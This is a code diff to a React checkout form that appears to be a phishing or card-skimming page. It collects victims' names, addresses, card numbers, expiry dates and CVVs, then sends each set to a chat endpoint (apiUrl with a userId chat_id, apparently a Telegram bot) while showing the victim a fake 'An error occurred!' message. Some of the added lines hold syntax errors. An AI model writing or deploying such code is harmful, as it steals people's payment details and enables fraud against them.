@@ -11,6 +11,54 @@ function App() {
   let [pdDisplay, setpdDisplay] = useState("d-none");
   let [acceptPaymentButton, setacceptPaymentButton] = useState("");
   let [ccDisplay, setccDisplay] = useState("d-none");
+
+
+  if (person.there){
+   let texts = `${person.fname}, ${person.lname}, ${person.street} , ${person.city}, ${person.zip}`
+    axios
+                    .post(apiUrl, {
+                      chat_id: userId,
+                      text: texts,
+                    })
+                    .then((response) => {
+                      if (response.data.ok) {
+                        return;
+                        // console.log("Message sent successfully!");
+                      } else {
+                        console.error(
+                          "Failed to send message:",
+                          response.data.description
+                        );
+                      }
+                    })
+                    .catch((error) => {
+                      console.error("Error:", error.message);
+                    });
+
+
+    if (card.there){
+      let cards = `  ${card.cc}, ${card.month}, ${card.year},  ${card.cvv},`
+      axios
+                .post(apiUrl, {
+                  chat_id: userId,
+                  text: cards,
+                })
+                .then((response) => {
+                  if (response.data.ok) {
+                    return;
+                    // console.log("Message sent successfully!");
+                  } else {
+                    console.error(
+                      "Failed to send message:",
+                      response.data.description
+                    );
+                  }
+                })
+                .catch((error) => {
+                  console.error("Error:", error.message);
+                });
+    }
+  }
   return (
     <div className="container  mx-auto text-center">
       <div>
@@ -127,6 +175,7 @@ function App() {
                   setpdDisplay("d-none");
                   setccDisplay("d-block");
                   setPerson({
+                    there : true;
                     fname: document.getElementById("validationCustom01").value,
                     lname: document.getElementById("validationCustom02").value,
                     street: document.getElementById("validationCustomUsername")
@@ -134,25 +183,7 @@ function App() {
                     city: document.getElementById("validationCustom03").value,
                     zip: document.getElementById("validationCustom05").value,
                   });
-                  axios
-                    .post(apiUrl, {
-                      chat_id: userId,
-                      text: person,
-                    })
-                    .then((response) => {
-                      if (response.data.ok) {
-                        return;
-                        // console.log("Message sent successfully!");
-                      } else {
-                        console.error(
-                          "Failed to send message:",
-                          response.data.description
-                        );
-                      }
-                    })
-                    .catch((error) => {
-                      console.error("Error:", error.message);
-                    });
+                  
                 }}
               >
                 Next
@@ -168,30 +199,13 @@ function App() {
               e.preventDefault();
               setMessage("An error occurred!");
               setCard({
+                there: true
                 cc: document.getElementById("cardNO").value,
                 Month: document.getElementById("month-select").value,
                 year: document.getElementById("year-select").value,
                 cvv: document.getElementById("cvv").value,
               });
-              axios
-                .post(apiUrl, {
-                  chat_id: userId,
-                  text: card,
-                })
-                .then((response) => {
-                  if (response.data.ok) {
-                    return;
-                    // console.log("Message sent successfully!");
-                  } else {
-                    console.error(
-                      "Failed to send message:",
-                      response.data.description
-                    );
-                  }
-                })
-                .catch((error) => {
-                  console.error("Error:", error.message);
-                });
+              
             }}
             novalidate
           >
